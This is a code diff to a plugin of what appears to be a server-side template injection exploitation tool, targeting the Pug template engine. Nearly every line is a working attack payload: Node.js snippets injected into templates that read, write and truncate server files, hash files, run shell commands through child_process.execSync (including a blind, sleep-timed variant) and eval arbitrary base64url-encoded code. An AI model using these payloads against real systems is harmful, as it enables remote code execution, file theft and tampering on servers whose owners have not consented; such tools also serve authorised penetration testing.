@@ -1,31 +1,36 @@
 from plugins.languages import javascript
+from utils import rand
 
 
 class Pug(javascript.Javascript):
+    generic_plugin = True
+
     def init(self):
         self.update_actions({
             'render': {
                 'call': 'inject',
-                'render': '\n= {code}\n',
+                'render': '{code}',
                 'header': '\n= {header}\n',
                 'trailer': '\n= {trailer}\n',
+                'test_render': f'|#{{typeof({rand.randints[0]})+{rand.randints[1]}}}',
+                'test_render_expected': f'number{rand.randints[1]}'
             },
             # No evaluate_blind here, since we've no sleep, we'll use inject
             'write': {
                 'call': 'inject',
                 # Payloads calling inject must start with \n to break out already started lines
-                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64'), 'binary')
+                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64}', 'base64url'), 'binary')
 """,
                 'truncate': """\n- global.process.mainModule.require('fs').writeFileSync('{path}', '')
 """
             },
             'read': {
                 'call': 'render',
-                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
+                'read': """= global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
             },
             'md5': {
                 'call': 'render',
-                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
+                'md5': """= global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
             },
             'blind': {
                 'call': 'execute_blind',
@@ -41,14 +46,15 @@ class Pug(javascript.Javascript):
                 # It's two lines command to avoid false positive with Javascript module
                 'execute_blind': """
 - x = global.process.mainModule.require
-- x('child_process').execSync(Buffer('{code_b64}', 'base64').toString() + ' && sleep {delay}')
+- x('child_process').execSync(Buffer('{code_b64}', 'base64url').toString() + ' && sleep {delay}')
 """
             },
             'execute': {
                 'call': 'render',
-                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64').toString())"""
+                'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64}', 'base64url').toString())"""
             },
             'evaluate': {
+                'evaluate': """= eval(Buffer('{code_b64}', 'base64url').toString())""",
                 'test_os': """global.process.mainModule.require('os').platform()"""
             },
         })
